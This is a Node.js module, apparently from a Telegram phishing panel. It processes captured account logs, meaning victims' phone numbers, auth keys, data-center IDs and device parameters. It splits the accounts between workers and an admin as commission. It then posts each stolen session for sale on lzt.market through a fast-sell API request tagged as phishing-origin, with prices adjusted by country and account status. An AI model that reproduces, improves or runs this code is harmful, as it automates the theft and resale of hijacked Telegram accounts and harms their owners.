import Log from './database/log.js';
import user from './database/user.js';
import config from '../config.json' assert { type: "json" };
import TelegramBot from 'node-telegram-bot-api';
import axios from 'axios';
import commission from './database/commission.js';
import market from './database/market.js';
import parsePhoneNumber from 'libphonenumber-js'
import lolz from './lolz/index.js';

const bot = new TelegramBot(config.notify, { polling: false });


export default async log => {
    const worker = await user.findOne({ id: log.worker });

    const logsCount = (await Log.find({ 'worker': log.worker })).length;
    const com = (await commission.findOne({}))?.value
    let country = (parsePhoneNumber(log.phone) || parsePhoneNumber("+" + log.phone))?.country?.toLocaleLowerCase();

    if (country === 'by') {
        country = 'br';
    }

    let msg = `<b>⚡️ Аккаунт </b>${log.phone}
${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new TelegramBot(log.bot, { polling: false }).getMe().catch(() => { }) || {}).username}` : `ℹ️ Добытый с домена ${log.bot}`}`
    
    worker.com = worker.com || com;
    if (logsCount + 1 === worker.com || (worker.com && (logsCount + 1) % worker.com === 0)) {
        log.bot = 'com';
        
        if (worker.notify) await bot.sendMessage(worker.id, `${msg}\n\n<b>🤝🏻 Был отдан в качестве комиссии</b>`, {
            parse_mode: 'HTML'
        })
        const owner = await user.findOne({ id: config.admin });
        worker.lzt = owner.admToken;
        worker.id = owner.id;
        worker.notify = owner.notify;
        worker.lztOn = owner.lztOn;
    }
    // if(worker.ref ) {
    //     const settings = await commission.findOne();
    //     if(settings.ref && (logsCount + 1) % settings.ref === 0) {
    //         log.bot = 'ref';
    //         if (worker.notify) await bot.sendMessage(worker.id, `${msg}\n\n<b>🤝🏻 Был отдан в качестве партнера</b>`, {
    //             parse_mode: 'HTML'
    //         })
    //     }
    // }

    const marketSettings = await market.findOne({ 'token': worker.lzt });

    const newLog = await new Log({
        ...log,
        created: Date.now()
    }).save();

    if (worker.lztOn && marketSettings) {
        async function send() {
            const response = await axios({
                method: 'POST',
                url: 'https://api.lzt.market/item/fast-sell?currency=rub&item_origin=fishing',
                headers: {
                    accept: 'application/json',
                    'content-type': 'application/json',
                    authorization: `Bearer ${worker.lzt}`
                },
                data: {
                    description: marketSettings.bio,
                    login: log.authKey,
                    password: log.dcId,
                    title: marketSettings.name,
                    title_en: marketSettings.nameEn,
                    price: log.premium ? marketSettings.premium : marketSettings[country || 'price'] || marketSettings.price,
                    category_id: 24,
                    extra: {
                        checkSpam: true,
                        telegramClient:
                        {
                            "telegram_api_id": log.deviceParams.app_id,
                            "telegram_api_hash": log.deviceParams.app_hash,
                            "telegram_device_model": log.deviceParams.device,
                            "telegram_system_version": log.deviceParams.sdk,
                            "telegram_app_version": log.deviceParams.app_version
                        }
                        ,
                        checkChannels: true
                    }
                }
            })
            .catch(error => {
                console.log('LZT Error:', error.message);
                
                if (error.response) {
                    return error.response;
                } else if (error.request) {
                    console.log('No response received:', error.request);
                    return { status: 500, data: { error: ['Нет ответа от сервера LZT'] } };
                } else {
                    return { status: 500, data: { error: [error.message] } };
                }
            });

            if (!response) {
                console.log('Получен пустой ответ от LZT API');
                return;
            }

            const error = (response?.data?.errors || response?.data?.error)?.[0] || (((response?.status || 200) === 200 || response?.status === 502) ? null : 'Технические работы LZT маркета');
            if (!error) {
                const account = response?.data?.item;
                const item_id = account?.item_id;
                let isResale = false
                if(account?.itemOriginPhrase?.includes("Перепродажа")) {
                    isResale = true
                }
                msg += `\n\n<b>✅ Успешно выложен на лолз <a href="https://lzt.market/${item_id}">LZT</a></b>`;
                console.log(account)
                if (account?.telegram_spam_block === -3 || account?.telegram_password) {
                    const price = account.telegram_password === -3 ? marketSettings.pass : marketSettings.spam;

                    const res = await lolz.editPrice(worker.lzt, item_id, price);
                    console.log(res)
                }
                await market.findOneAndUpdate(
                    { id: marketSettings.id },
                    {
                        $inc: { success: 1, resale: isResale ? 1 : 0 },
                        $set: { item_id }
                    }
                );

            } else {
                if (error === 'captcha') {
                    return await send();
                }
                // if (error === 'Too Many Requests') {
                //     setTimeout(async () => {
                //         return await send();
                //     }, 3000);
                // }

                await market.findOneAndUpdate({ id: marketSettings.id }, { $inc: { error: 1 } })
                msg += `\n\n<b>❗️ Не удалось выложить на лолз</b>\nОшибка: ${error} (Ошибка на стороне LZT)`;
            }
        }

        await send();
    }

    if (worker.notify) await bot.sendMessage(worker.id, msg, {
        parse_mode: 'HTML'
    }).catch(console.log);
}